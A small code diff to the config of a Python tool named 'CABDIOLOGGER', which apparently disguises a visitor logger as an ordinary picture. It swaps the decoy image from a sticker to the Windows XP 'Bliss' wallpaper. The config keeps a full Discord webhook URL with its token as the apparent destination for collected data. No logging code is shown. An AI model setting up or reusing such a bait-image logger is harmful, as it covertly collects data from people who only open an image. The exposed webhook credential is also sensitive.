@@ -12,7 +12,7 @@ __author__ = "cabdio"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1453394269707567206/X7Y9no-MUWN_9_bsMU-VQkQfuep165UM4yRWQ0byI9ExI9y6UXmZJAa9C6HAHf5bFFbA",
-    "image": "https://stickerly.pstatic.net/sticker_pack/eNrxqOuc388RTr1MVqOg/BKPGHG/16/61453289.png", 
+    "image": "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259888-orig.jpg", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
